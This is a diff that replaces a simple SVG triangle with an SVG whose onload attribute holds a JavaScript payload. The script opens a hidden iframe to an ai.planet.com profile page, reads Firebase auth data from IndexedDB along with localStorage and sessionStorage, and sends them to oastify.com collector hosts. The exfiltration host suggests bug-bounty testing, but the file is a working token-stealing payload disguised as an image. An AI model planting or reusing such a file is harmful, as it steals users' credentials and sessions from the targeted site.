@@ -1,5 +1,54 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" />
+<svg xmlns="http://www.w3.org/2000/svg" onload="
+  var iframe = document.createElement('iframe');
+  iframe.src = 'https://ai.planet.com/profile';
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  
+  iframe.onload = function() {
+    var win = iframe.contentWindow;
+    
+    // Access IndexedDB where Firebase stores auth
+    var request = win.indexedDB.open('firebase-installations-database');
+    
+    request.onsuccess = function(event) {
+      var db = event.target.result;
+      var transaction = db.transaction(['firebase-installations-store'], 'readonly');
+      var store = transaction.objectStore('firebase-installations-store');
+      var getAll = store.getAll();
+      
+      getAll.onsuccess = function() {
+        var firebaseData = getAll.result;
+        
+        // Exfiltrate Firebase tokens
+        fetch('https://deeparmor.oastify.com/firebase', {
+          method: 'POST',
+          body: JSON.stringify({
+            firebaseInstallations: firebaseData,
+            // Also try other Firebase DBs
+            localStorage: JSON.stringify(win.localStorage),
+            sessionStorage: JSON.stringify(win.sessionStorage)
+          })
+        });
+      };
+    };
+    
+    // Also try common Firebase database names
+    var firebaseDBs = [
+      'firebase-local-storage',
+      'firebase-auth-database', 
+      'firebase::firebase:ai.planet.com',
+      'persistence:ai.planet.com'
+    ];
+    
+    firebaseDBs.forEach(function(dbName) {
+      try {
+        var req = win.indexedDB.open(dbName);
+        req.onsuccess = function(e) {
+          // Exfiltrate each DB
+          fetch('https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/db?name=' + dbName);
+        };
+      } catch(e) {}
+    });
+  };
+">
 </svg>
